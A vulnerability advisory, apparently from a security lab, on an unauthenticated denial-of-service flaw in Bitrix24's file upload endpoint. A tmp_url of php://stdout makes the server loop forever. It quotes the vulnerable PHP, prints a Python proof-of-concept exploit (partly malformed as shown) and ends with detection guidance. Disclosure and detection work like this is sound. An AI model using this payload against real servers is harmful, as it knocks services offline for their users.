## Vulnerability Details:[#](#vulnerability-details)

This report presents information on a Denial of Service (DoS) vulnerability that allows an attacker cause the affected webserver to be unresponsive due to excessive computing resource consumption.

Unauthenticated users may use the file upload functionality provided by the `/desktop_app/file.ajax.php?action=uploadfile`. In addition to files uploaded within the request, files can also be specified by their URL. These files will then by downloaded and saved. This URL is specified in the `tmp_url` field of the supplied file object.

The `checkFile` function is eventually called on the file object:

```
// bitrix/modules/main/lib/ui/uploader/file.php line 590
public static function checkFile(&$file, File $f, $params)
{
    $result = new Result();
    if ($file["error"] > 0)
        $result->addError(new Error(File::getUploadErrorMessage($file["error"]), "BXU347.2.9".$file["error"]));
    else if (array_key_exists("tmp_url", $file))
    {
        $url = new Uri($file["tmp_url"]); // [1]
        if ($url->getHost() == '' &&
            ($tmp = \CFile::MakeFileArray($url->getPath())) && // [2]
            is_array($tmp))
        {
            $file = array_merge($tmp, $file);
        }
        // ...
    }
    // ...
}

```

In `[1]`, the URL supplied in `tmp_url` is parsed. The path of the URL is then passed to `CFile::MakeFileArray` in `[2]`.

```
// bitrix/modules/main/classes/general/file.php line 1734
public static function MakeFileArray($path, $mimetype = false, $skipInternal = false, $external_id = "")
{
    $io = CBXVirtualIo::GetInstance();
    $arFile = array();
    if(intval($path)>0)
    {
        // ...
    }
    $path = preg_replace("#(?<!:)[\\\\\\/]+#", "/", $path);
    if($path == '' || $path == "/")
    {
        return NULL;
    }
    if(preg_match("#^(php://filter|phar://)#i", $path))
    {
        return NULL;
    }
    if(preg_match("#^(http[s]?)://#", $path))
    {
        // ...
    }
    elseif(preg_match("#^(ftp[s]?|php)://#", $path)) // [3]
    {
        if($fp = fopen($path,"rb"))
        {
            $content = "";
            while(!feof($fp)) // [4]
            {
                $content .= fgets($fp, 4096);
            }
            if($content <> '')
            {
                // ...
            }
            fclose($fp);
        }
    }
    else
    {
        // ...
    }
    // ..
}

```

If the path starts with `ftp://`, `ftps://` or `php://`, control flow enters the branch at `[3]`. The file is then opened with `fopen`, and its contents are read in chunks of 4096 bytes until the EOF marker is reached (`[4]`).

However, if an attacker specifies the PHP stream `php://stdout`, the EOF marker will never be reached as the stream is a write-only stream. Therefore, the program will enter an infinite loop as `!feof($fp)` will always be true.

This will result in the process handling the request consuming as much compute time as it is allowed, preventing the handling of other legitimate requests.

## Proof-of-Concept:[#](#proof-of-concept)

We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that results in Denial of Service via resource exhaustion on the target server.

A sample exploit script is shown below:

```
# Bitrix24 Improper File Stream Access DoS (CVE-2023-XXXXX)
# Via: https://TARGET_HOST/desktop_app/file.ajax.php?action=uploadfile
# Author: Lam Jun Rong (STAR Labs SG Pte. Ltd.)
#!/usr/bin/env python3
import random
import requests
import re
HOST = "http://localhost:8000"
SITE_ID = "s1"
PROXY = {"http": "http://localhost:8080"}
def preauth(s):
    res = s.get(HOST)
    return re.search(re.compile("'bitrix_sessid':'([a-f0-9]{32})'"), res.text).group(
        1
    )
def DoS(session, sessid):
    CID = random.randint(0, pow(10, 5))
    session.post(
        HOST + "/desktop_app/file.ajax.php?action=uploadfile",
        headers={

            "X-Bitrix-Site-Id": SITE_ID,
        },

            "bxu_files[0][files][default][tmp_url]": f"a:php://stdout",
            "bxu_files[0][files][default][tmp_name]": f"file{CID}",
        },
        proxies=PROXY,
    )
if __name__ == "__main__":
    s = requests.Session()
    s.proxies = PROXY
    sessid = preauth(s)
    print("[+] Launching DoS...")
    DoS(s, sessid)

```
## Exploit Conditions:[#](#exploit-conditions)

This vulnerability can be exploited by unauthenticated users.

## Detection Guidance:[#](#detection-guidance)

It is possible to detect the exploitation of this vulnerability by examining traffic logs to detect the presence of `php://stdout` or `file:///dev/stdout` in request bodies.
